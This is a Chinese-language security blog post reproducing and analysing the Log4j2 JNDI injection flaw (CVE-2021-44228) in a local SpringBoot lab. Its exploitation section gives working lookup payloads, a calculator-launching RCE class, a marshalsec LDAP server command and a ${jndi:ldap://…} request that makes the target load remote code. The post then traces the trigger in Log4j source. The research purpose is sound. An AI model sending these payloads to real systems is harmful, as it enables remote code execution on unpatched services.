<!DOCTYPE html><html lang="en" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>CVE-2021-44228 Log4j2 JNDI注入漏洞 | _0xf4n9x_'s Blog</title><meta name="author" content="_0xf4n9x_"><meta name="copyright" content="_0xf4n9x_"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="漏洞简介Apache Log4j2是一个通用的工业级Java日志框架，常用于Java应用中，如Web应用、分布式系统、微服务架构等，它能够帮助开发人员记录并追踪系统中的异常、性能问题和业务逻辑。 2021年12月9日，存在于Log4j2 JNDI功能中的一个远程代码执行漏洞利用细节被公开，随即对全球范围内使用Log4j2的应用和系统产生了重大影响。 该漏洞的根本原因是源于Log4j2的日志消息解析">
<meta property="og:type" content="article">
<meta property="og:title" content="CVE-2021-44228 Log4j2 JNDI注入漏洞">
<meta property="og:url" content="https://0xf4n9x.github.io/cve-2021-44228-log4j2-jndi-attack.html">
<meta property="og:site_name" content="_0xf4n9x_&#39;s Blog">
<meta property="og:description" content="漏洞简介Apache Log4j2是一个通用的工业级Java日志框架，常用于Java应用中，如Web应用、分布式系统、微服务架构等，它能够帮助开发人员记录并追踪系统中的异常、性能问题和业务逻辑。 2021年12月9日，存在于Log4j2 JNDI功能中的一个远程代码执行漏洞利用细节被公开，随即对全球范围内使用Log4j2的应用和系统产生了重大影响。 该漏洞的根本原因是源于Log4j2的日志消息解析">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://0xf4n9x.github.io/img/post/cve-2021-44228-log4j2-jndi-attack/0.png">
<meta property="article:published_time" content="2022-01-07T15:54:13.000Z">
<meta property="article:modified_time" content="2022-01-07T15:54:13.000Z">
<meta property="article:author" content="_0xf4n9x_">
<meta property="article:tag" content="cve">
<meta property="article:tag" content="java">
<meta property="article:tag" content="rce">
<meta property="article:tag" content="log4j">
<meta property="article:tag" content="jndi">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://0xf4n9x.github.io/img/post/cve-2021-44228-log4j2-jndi-attack/0.png"><link rel="shortcut icon" href="/img/favicon.ico"><link rel="canonical" href="https://0xf4n9x.github.io/cve-2021-44228-log4j2-jndi-attack.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//www.google-analytics.com" crossorigin=""/><link rel="preconnect" href="//static.cloudflareinsights.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script async="async" src="https://www.googletagmanager.com/gtag/js?id=G-YRH7DCY1TL"></script><script>window.dataLayer = window.dataLayer || [];
function gtag(){dataLayer.push(arguments);}
gtag('js', new Date());
gtag('config', 'G-YRH7DCY1TL');
</script><script defer="defer" data-pjax="data-pjax" src="https://static.cloudflareinsights.com/beacon.min.js" data-cf-beacon="{&quot;token&quot;: &quot;3f9a5286f0c84213b902626e6f7a5081&quot;}"></script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: 'Just',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: false,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'CVE-2021-44228 Log4j2 JNDI注入漏洞',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2022-01-07 23:54:13'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
      const link = document.createElement('link')
      link.rel = 'stylesheet'
      link.href = url
      if (id) link.id = id
      link.onerror = reject
      link.onload = link.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        link.onload = link.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(link)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          const now = new Date()
          const hour = now.getHours()
          const isNight = hour <= 6 || hour >= 18
          if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
          else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="_0xf4n9x_'s Blog" type="application/atom+xml">
</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/favicon.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">26</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">24</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">5</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/post/cve-2021-44228-log4j2-jndi-attack/0.png')"><nav id="nav"><span id="blog-info"><a href="/" title="_0xf4n9x_'s Blog"><span class="site-name">_0xf4n9x_'s Blog</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);" rel="external nofollow noreferrer"><i class="fas fa-search fa-fw"></i><span> Search</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" rel="external nofollow noreferrer"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">CVE-2021-44228 Log4j2 JNDI注入漏洞</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2022-01-07T15:54:13.000Z" title="Created 2022-01-07 23:54:13">2022-01-07</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2022-01-07T15:54:13.000Z" title="Updated 2022-01-07 23:54:13">2022-01-07</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Java%E5%AE%89%E5%85%A8/">Java安全</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">Word count:</span><span class="word-count">4.5k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">Reading time:</span><span>23min</span></span><span class="post-meta-separator">|</span><span class="post-meta-commentcount"><i class="far fa-comments fa-fw post-meta-icon"></i><span class="post-meta-label">Comments:</span><a href="/cve-2021-44228-log4j2-jndi-attack.html#post-comment"><span class="gitalk-comment-count"><i class="fa-solid fa-spinner fa-spin"></i></span></a></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>Apache Log4j2是一个通用的工业级Java日志框架，常用于Java应用中，如Web应用、分布式系统、微服务架构等，它能够帮助开发人员记录并追踪系统中的异常、性能问题和业务逻辑。</p>
<p>2021年12月9日，存在于Log4j2 JNDI功能中的一个远程代码执行漏洞利用细节被公开，随即对全球范围内使用Log4j2的应用和系统产生了重大影响。</p>
<p>该漏洞的根本原因是源于Log4j2的日志消息解析机制存在缺陷，当日志消息中包含特定格式的字符串时，Log4j2会尝试通过JNDI去解析和加载远程资源，而攻击者可以利用这一点发送恶意的日志消息，指向恶意的LDAP服务器，从而实现远程代码执行。</p>
<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>2.0-beta9 ≤ Log4j2 ≤ 2.14.1</p>
<h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><p>在一个SpringBoot项目中的pom.xml文件中添加如下2.14.1版本的Log4j2 Maven依赖。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.14.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.14.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>然后编写如下SpringBoot应用，该应用会对用户的User-Agent以及登录的数据进行日志记录。在IDEA中启动该Web应用，这样，一个简单的漏洞复现环境就准备好了。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.javasec.log4j;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.LogManager;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.Logger;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.SpringApplication;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.autoconfigure.SpringBootApplication;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestHeader;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Log4ShellApplication</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Logger</span> <span class="variable">LOGGER</span> <span class="operator">=</span> LogManager.getLogger(Log4ShellApplication.class);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        SpringApplication.run(Log4ShellApplication.class, args);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">logUA</span><span class="params">(<span class="meta">@RequestHeader(&quot;User-Agent&quot;)</span> String ua)</span> &#123;</span><br><span class="line">        LOGGER.error(ua);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/login&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">logLogin</span><span class="params">(String data)</span> &#123;</span><br><span class="line">        LOGGER.error(data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">    __                __ __ _____ __         __________</span><br><span class="line">   / /   ____  ____ _/ // // ___// /_  ___  / / / ____/___ _   __</span><br><span class="line">  / /   / __ \/ __ `/ // /_\__ \/ __ \/ _ \/ / / __/ / __ \ | / /</span><br><span class="line"> / /___/ /_/ / /_/ /__  __/__/ / / / /  __/ / / /___/ / / / |/ /</span><br><span class="line">/_____/\____/\__, /  /_/ /____/_/ /_/\___/_/_/_____/_/ /_/|___/</span><br><span class="line">            /____/</span><br><span class="line">2022-01-05 23:12:33 INFO  Log4ShellApplication:55 - Starting Log4ShellApplication v1.0.0 using Java 1.8.0_181 on m with PID 81127 (/Users/r00t/GitHub/CVE-2021-44228/Log4ShellEnv.jar started by r00t in /Users/r00t/GitHub/CVE-2021-44228)</span><br><span class="line">2022-01-05 23:12:33 INFO  Log4ShellApplication:663 - No active profile set, falling back to default profiles: default</span><br><span class="line">2022-01-05 23:12:34 INFO  TomcatWebServer:108 - Tomcat initialized with port(s): 44228 (http)</span><br><span class="line">Jan 05, 2022 11:12:34 PM org.apache.coyote.AbstractProtocol init</span><br><span class="line">INFO: Initializing ProtocolHandler [&quot;http-nio-44228&quot;]</span><br><span class="line">Jan 05, 2022 11:12:34 PM org.apache.catalina.core.StandardService startInternal</span><br><span class="line">INFO: Starting service [Tomcat]</span><br><span class="line">Jan 05, 2022 11:12:34 PM org.apache.catalina.core.StandardEngine startInternal</span><br><span class="line">INFO: Starting Servlet engine: [Apache Tomcat/9.0.46]</span><br><span class="line">Jan 05, 2022 11:12:35 PM org.apache.catalina.core.ApplicationContext log</span><br><span class="line">INFO: Initializing Spring embedded WebApplicationContext</span><br><span class="line">2022-01-05 23:12:35 INFO  ServletWebServerApplicationContext:290 - Root WebApplicationContext: initialization completed in 1472 ms</span><br><span class="line">Jan 05, 2022 11:12:35 PM org.apache.coyote.AbstractProtocol start</span><br><span class="line">INFO: Starting ProtocolHandler [&quot;http-nio-44228&quot;]</span><br><span class="line">2022-01-05 23:12:36 INFO  TomcatWebServer:220 - Tomcat started on port(s): 44228 (http) with context path &#x27;&#x27;</span><br><span class="line">2022-01-05 23:12:36 INFO  Log4ShellApplication:61 - Started Log4ShellApplication in 3.394 seconds (JVM running for 4.839)</span><br><span class="line">2022-01-05 23:12:36 INFO  ApplicationAvailabilityBean:75 - Application availability state LivenessState changed to CORRECT</span><br><span class="line">2022-01-05 23:12:36 INFO  ApplicationAvailabilityBean:75 - Application availability state ReadinessState changed to ACCEPTING_TRAFFIC</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>发送如下两个HTTP请求。</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:44228</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>U=$&#123;sys:user.name&#125;; os=$&#123;sys:os.name&#125;; jv=$&#123;java:version&#125;</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/login</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:44228</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>20</span><br><span class="line"></span><br><span class="line"><span class="language-haskell"><span class="class"><span class="keyword">data</span>=$&#123;<span class="title">java</span>:<span class="title">version</span>&#125;</span></span></span><br></pre></td></tr></table></figure>

<p>回到IDEA控制台便可以看到如下日志输出，其中包含了系统用户名、操作系统名、Java版本。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">2022-01-05 23:12:18.124 ERROR 18704 --- [io-44228-exec-2] c.j.l.Log4ShellApplication               : U=r00t; os=Mac OS X; jv=Java version 1.8.0_181</span><br><span class="line">2022-01-05 23:13:05.890 ERROR 18704 --- [io-44228-exec-4] c.j.l.Log4ShellApplication               : Java version 1.8.0_181</span><br></pre></td></tr></table></figure>

<p>根据如上日志，可以发现Log4j2对带有${}的日志消息进行了特定格式的解析。</p>
<p>进一步的，我们可以通过JNDI注入来深入利用该漏洞。</p>
<p>准备如下RCE类，将其编译成class文件。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> java.lang.Process;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SuppressWarnings(&quot;all&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RCE</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Runtime</span> <span class="variable">rt</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">            String[] commands = &#123;<span class="string">&quot;open&quot;</span>, <span class="string">&quot;-a&quot;</span>, <span class="string">&quot;Calculator.app&quot;</span>&#125;;</span><br><span class="line">            <span class="type">Process</span> <span class="variable">pc</span> <span class="operator">=</span> rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后对外开放此文件。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server 4444</span><br><span class="line">Serving HTTP on :: port 4444 (http://[::]:4444/) ...</span><br></pre></td></tr></table></figure>

<p>并使用marshalsec（<a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/mbechler/marshalsec%EF%BC%89%E5%BC%80%E5%90%AF%E4%B8%80%E4%B8%AA%E6%81%B6%E6%84%8F%E7%9A%84LDAP%E6%9C%8D%E5%8A%A1%E5%99%A8%E3%80%82">https://github.com/mbechler/marshalsec）开启一个恶意的LDAP服务器。</a></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">java -<span class="built_in">cp</span> marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer <span class="string">&quot;http://192.168.1.100:4444/#RCE&quot;</span></span><br><span class="line">Listening on 0.0.0.0:1389</span><br></pre></td></tr></table></figure>

<p>最后利用如下Payload实施JNDI注入攻击，最终会弹出一个计算器。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST /login TTP/1.1</span><br><span class="line">Host: 127.0.0.1:44228</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 42</span><br><span class="line"></span><br><span class="line">data=<span class="variable">$&#123;jndi:ldap://192.168.1.100:1389/RCE&#125;</span></span><br></pre></td></tr></table></figure>

<p><img src="/img/post/cve-2021-44228-log4j2-jndi-attack/0.png"></p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>将如上漏洞环境简化至如下几行代码，如下便是漏洞触发的关键代码片段。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.javasec.log4j;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.LogManager;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.Logger;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Log4Shell</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Logger</span> <span class="variable">LOGGER</span> <span class="operator">=</span> LogManager.getLogger(Log4Shell.class);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">log</span> <span class="operator">=</span> <span class="string">&quot;$&#123;sys:user.name&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 默认配置下成功利用</span></span><br><span class="line">        <span class="comment">//LOGGER.fatal(log);</span></span><br><span class="line">        LOGGER.error(log);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 默认配置下利用无效</span></span><br><span class="line">        <span class="comment">//LOGGER.info(log);</span></span><br><span class="line">        <span class="comment">//LOGGER.warn(log);</span></span><br><span class="line">        <span class="comment">//LOGGER.debug(log);</span></span><br><span class="line">        <span class="comment">//LOGGER.trace(log);</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>首先从Log4j日志管理器中获取一个与Log4Shell类相关联的日志记录器，并将其赋值给一个名为LOGGER的变量。其中Logger接口代表一个日志记录器，用于记录日志信息，它提供了多种方法来记录不同级别的日志信息（如debug、info、warn、error等）。这样，就可以在Log4Shell类中使用LOGGER对象来记录日志信息，例如随后执行的LOGGER.error()方法。</p>
<h3 id="漏洞触发点"><a href="#漏洞触发点" class="headerlink" title="漏洞触发点"></a>漏洞触发点</h3><p>那么我们便可以将断点断在LOGGER.error(log)代码行，从此处开始跟进分析。</p>
<p>由于Logger接口中的error(java.lang.String)方法在org.apache.logging.log4j.spi.AbstractLogger类中存在一个重写方法，所以起初会进入到了org.apache.logging.log4j.spi.AbstractLogger#error(java.lang.String)方法中。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">error</span><span class="params">(<span class="keyword">final</span> String message)</span> &#123;</span><br><span class="line">    logIfEnabled(FQCN, Level.ERROR, <span class="literal">null</span>, message, (Throwable) <span class="literal">null</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/img/post/cve-2021-44228-log4j2-jndi-attack/1.png"></p>
<p>FQCN由<code>AbstractLogger.class.getName()</code>方法而来，即org.apache.logging.log4j.spi.AbstractLogger。</p>
<p>依据org.apache.logging.log4j.Level类中的静态代码块可知，Level.ERROR会是<code>new Level(&quot;ERROR&quot;, StandardLevel.ERROR.intLevel())</code>。</p>
